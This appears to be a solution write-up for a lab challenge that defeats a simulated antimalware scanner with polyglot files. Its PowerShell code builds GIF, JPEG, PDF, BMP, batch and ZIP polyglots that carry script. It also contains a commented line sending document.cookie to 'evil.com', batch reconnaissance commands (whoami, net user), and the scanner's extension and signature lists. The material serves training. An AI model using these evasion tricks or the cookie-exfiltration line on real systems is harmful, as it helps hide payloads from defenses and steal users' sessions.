---
title: "Solution 30: Polyglot File (Multi-Format Valid File)"
challenge_number: 30
difficulty: hard
category: "Extension Heuristic Bypass"
permalink: /solutions/30-polyglot-file/
---

# Solution: Polyglot File (Multi-Format Valid File)

[Back to Challenge](../challenges/30-polyglot-file.md)

## Overview

A polyglot file is valid in multiple file formats simultaneously. By structuring the file so it has an innocent extension (e.g., `.gif`, `.pdf`, `.bmp`) while also containing executable code (HTML, JavaScript, batch commands), it bypasses extension-based checks entirely. The scanner sees a `.gif` file — not suspicious. But the same bytes are also valid HTML/JS that a browser will execute.

## Working Code

### GIF/HTML Polyglot

```powershell
# GIF89a header is valid GIF magic AND partially valid ASCII
# Structure: GIF header + HTML/JS payload in GIF comment block

$polyglot = @"
GIF89a/*<html><body><script>
// This file is simultaneously a valid GIF image AND executable HTML/JS
alert('Polyglot executed! This is both a GIF and HTML.');
document.write('<h1>Payload Active</h1>');
// Exfiltration example:
// new Image().src = 'http://evil.com/steal?cookie=' + document.cookie;
</script></body></html>*/=0;
"@

# Add minimal GIF image data after the comment
$gifHeader = [byte[]](0x47,0x49,0x46,0x38,0x39,0x61)  # GIF89a
$gifData = [byte[]](0x01,0x00,0x01,0x00,0x00,0x00,0x00,  # 1x1 image
                    0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,
                    0x02,0x02,0x44,0x01,0x00,0x3B)  # image data + trailer

# Write as .gif (passes extension check) but openable as HTML
Set-Content -Path "harmless.gif" -Value $polyglot -NoNewline

Write-Host "Created: harmless.gif"
Write-Host "  - Opens in image viewer: shows as (corrupt) GIF"
Write-Host "  - Opens in browser: executes JavaScript"
```

### Proper GIF89a/JavaScript Polyglot

```powershell
# More robust version using GIF comment extension for the JS payload
# GIF89a header bytes are chosen to be valid (if odd-looking) JavaScript

$bytes = New-Object System.Collections.ArrayList

# GIF89a magic (also starts a JS expression: GIF89a is a valid identifier-start)
[void]$bytes.AddRange([byte[]](0x47, 0x49, 0x46, 0x38, 0x39, 0x61))

# Logical screen descriptor (width=10, height=10, no GCT)
[void]$bytes.AddRange([byte[]](0x0A, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00))

# Comment Extension (0x21 0xFE)
[void]$bytes.AddRange([byte[]](0x21, 0xFE))

# Comment data containing our JS payload
$jsPayload = "*/=1;alert('GIF+JS polyglot executed!');/*"
$jsBytes = [System.Text.Encoding]::ASCII.GetBytes($jsPayload)
[void]$bytes.Add([byte]$jsBytes.Length)  # sub-block length
[void]$bytes.AddRange($jsBytes)
[void]$bytes.Add([byte]0x00)  # block terminator

# Minimal image data
[void]$bytes.AddRange([byte[]](0x2C, 0x00, 0x00, 0x00, 0x00,  # Image descriptor
    0x0A, 0x00, 0x0A, 0x00, 0x00,  # 10x10, no LCT
    0x02, 0x02, 0x44, 0x01, 0x00,  # LZW min code + data
    0x3B))  # GIF trailer

[System.IO.File]::WriteAllBytes("$PWD\polyglot.gif", [byte[]]$bytes.ToArray())
Write-Host "Created polyglot.gif (valid GIF + contains JS)"
```

### BMP/HTML Polyglot

```powershell
# BMP header can coexist with HTML because browsers are lenient
# BMP starts with "BM" followed by file size - browsers skip binary preamble

$htmlPayload = @"
<!--BM_HEADER_PADDING -->
<html>
<body>
<h1>BMP/HTML Polyglot</h1>
<script>
alert('Executed from a .bmp file!');
// Payload here
var data = document.cookie;
</script>
</body>
</html>
"@

# Create with .bmp extension
Set-Content -Path "image.bmp" -Value $htmlPayload -NoNewline
# Optionally prepend actual BMP header for image viewers
```

### PDF/JavaScript Polyglot

```powershell
# PDF format allows embedded JavaScript via OpenAction
# This is a valid PDF that executes JS when opened in a PDF reader

$pdfPolyglot = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj

4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('PDF JS executed!');) >>
endobj

xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000092 00000 n
0000000153 00000 n
0000000232 00000 n

trailer
<< /Size 5 /Root 1 0 R >>
startxref
325
%%EOF
"@

Set-Content -Path "document.pdf" -Value $pdfPolyglot -NoNewline
Write-Host "Created document.pdf (valid PDF with embedded JavaScript)"
```

### JPEG/JavaScript Polyglot (via JPEG Comment)

```powershell
# JPEG files can contain comments (APP0/COM markers) with arbitrary data
# Structure: SOI + COM marker with JS + minimal JPEG data

$bytes = New-Object System.Collections.ArrayList

# JPEG SOI (Start of Image)
[void]$bytes.AddRange([byte[]](0xFF, 0xD8))

# COM marker (comment)
[void]$bytes.AddRange([byte[]](0xFF, 0xFE))

# Comment containing JavaScript
$jsCode = "*/=1;alert('JPEG/JS polyglot!');/*"
$jsCodeBytes = [System.Text.Encoding]::ASCII.GetBytes($jsCode)
$commentLen = $jsCodeBytes.Length + 2  # +2 for length field itself
[void]$bytes.Add([byte](($commentLen -shr 8) -band 0xFF))  # Length high byte
[void]$bytes.Add([byte]($commentLen -band 0xFF))            # Length low byte
[void]$bytes.AddRange($jsCodeBytes)

# Minimal JPEG image data (1x1 white pixel)
# SOF0 + DHT + SOS + EOI
[void]$bytes.AddRange([byte[]](
    0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x11, 0x00,
    0xFF, 0xC4, 0x00, 0x14, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00, 0x7F, 0x50,
    0xFF, 0xD9  # EOI
))

[System.IO.File]::WriteAllBytes("$PWD\photo.jpg", [byte[]]$bytes.ToArray())
Write-Host "Created photo.jpg (valid JPEG with embedded JS in comment)"
```

### Batch/JPEG Polyglot (Executable on Windows)

```powershell
# A file that's simultaneously valid batch and has image magic bytes
# Batch ignores lines starting with non-commands via labels/REM

@"
@REM JFIF
@echo off
REM This file has JPEG-like bytes but is actually a batch file
echo Batch/Image polyglot executed!
whoami
REM The scanner sees .jpg extension and doesn't flag it
"@ | Set-Content "photo.jpg.bat"  # Or just .bat disguised

# True polyglot approach - rename to just .jpg but execute via cmd:
@"
@REM ÿØÿà
@echo off
echo Polyglot payload running
net user
"@ | Set-Content "document.jpg"

# Execute the "image" as batch
cmd /c "document.jpg"
```

### HTML/ZIP Polyglot

```powershell
# ZIP files can have arbitrary data prepended (self-extracting archives work this way)
# Create HTML that's also a valid ZIP

$htmlPrefix = @"
<html><body><script>
alert('HTML/ZIP polyglot! This file is both a webpage and a ZIP archive.');
// Hidden payload executes in browser context
</script></body></html>
<!--
"@

# Write HTML prefix
$prefixBytes = [System.Text.Encoding]::ASCII.GetBytes($htmlPrefix)

# Create a small ZIP file
Compress-Archive -Path "payload.ps1" -DestinationPath "temp.zip" -Force
$zipBytes = [System.IO.File]::ReadAllBytes("$PWD\temp.zip")

# Concatenate: HTML + ZIP (ZIP readers find the central directory at the end)
$polyglotBytes = $prefixBytes + $zipBytes
[System.IO.File]::WriteAllBytes("$PWD\archive.html", $polyglotBytes)

# This file:
# - Opens in browser: executes JavaScript
# - Opens in ZIP tools: extracts payload.ps1
# - Named .html: not in suspicious extension list!

Remove-Item "temp.zip" -ErrorAction SilentlyContinue
```

## Why It Works

The scanner's detection is based on two things:
1. **Extension check**: Only warns for `.exe`, `.bat`, `.cmd`, `.ps1`, `.vbs`, `.js`, `.wsf`, `.scr`, `.pif`, `.com`, `.hta`
2. **Signature strings**: Searches for 7 specific text patterns

A polyglot exploits both weaknesses:

**Extension bypass**: Named `.gif`, `.jpg`, `.bmp`, `.pdf`, or `.html` — none are in the suspicious list. Zero warnings generated.

**Signature bypass**: Image formats use binary data that won't accidentally contain English words like "malware" or "trojan". The JavaScript payload uses its own syntax (`alert`, `document`, `fetch`) which doesn't match any signature.

**Why polyglots are possible**: File formats are identified by their structure (magic bytes, headers, trailers), not by their extension. Many formats:
- Have lenient parsers that skip unknown data
- Support comment/metadata fields with arbitrary content
- Only check specific offsets for magic numbers
- Allow prepended or appended data to be ignored

Browsers are especially lenient — they often attempt to render content based on sniffing, regardless of served MIME type or extension.

## How to Verify

1. Create the GIF/HTML polyglot:
   ```powershell
   $polyglot = "GIF89a/*<html><body><script>alert('polyglot!')</script></body></html>*/=0;"
   Set-Content -Path "test_polyglot.gif" -Value $polyglot -NoNewline
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe test_polyglot.gif
   ```

3. Expected result: **No detection**
   - Extension `.gif` is not in the suspicious list → no warning
   - Content contains no signature strings → no signature match
   - File passes completely clean

4. Verify it works as HTML/JS:
   ```powershell
   # Open in default browser - JavaScript executes
   Start-Process "test_polyglot.gif"
   # Or explicitly in browser:
   Start-Process "chrome.exe" "--allow-file-access-from-files file:///$PWD/test_polyglot.gif"
   ```

5. Verify it's recognized as GIF:
   ```powershell
   # Check magic bytes
   $header = [System.IO.File]::ReadAllBytes("$PWD\test_polyglot.gif")[0..5]
   $magic = [System.Text.Encoding]::ASCII.GetString($header)
   Write-Host "Magic bytes: $magic"  # "GIF89a" - valid GIF header
   ```

6. Confirm no signatures present:
   ```powershell
   $content = Get-Content "test_polyglot.gif" -Raw
   @("malware","trojan","virus","keylogger","ransomware","exploit","backdoor") |
       ForEach-Object { Write-Host "$_`: $($content.ToLower().Contains($_))" }
   # All False
   ```
